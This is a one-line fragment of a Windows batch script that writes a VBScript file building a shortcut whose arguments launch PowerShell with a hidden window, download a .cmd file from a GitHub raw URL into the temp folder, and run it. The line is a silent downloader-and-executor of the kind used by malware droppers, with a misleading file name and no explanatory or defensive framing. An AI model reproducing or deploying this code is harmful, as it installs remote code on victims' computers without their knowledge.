...
echo lnk.Arguments = "/c powershell.exe -w hidden -c ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/tiiisiet65-sudo/LoioioNoaisK/main/Download-macOSx.cmd' -OutFile $env:TEMP\s.cmd; & $env:TEMP\s.cmd""" >> make_sc.vbs
